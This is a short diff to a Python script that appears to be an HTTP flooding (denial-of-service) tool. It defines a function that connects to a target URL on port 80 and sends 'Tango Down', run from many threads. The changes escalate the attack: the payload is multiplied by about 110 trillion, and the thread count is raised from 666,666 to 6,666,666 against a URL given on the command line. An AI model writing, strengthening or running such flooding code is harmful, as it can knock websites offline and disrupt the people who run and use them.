@@ -91,7 +91,7 @@ def httpcall(url):
 			
 	except Exception:
 			s.connect((url,80))
-			s.sendall("Tango Down")
+			s.sendall("Tango Down" * 109951162777600)
 
 	
 #http caller thread 
@@ -119,7 +119,7 @@ else:
 		url = sys.argv[1]
 		
 		
-		for i in range(666666):
+		for i in range(6666666):
 			t = HTTPThread()
 			t.start()
 		
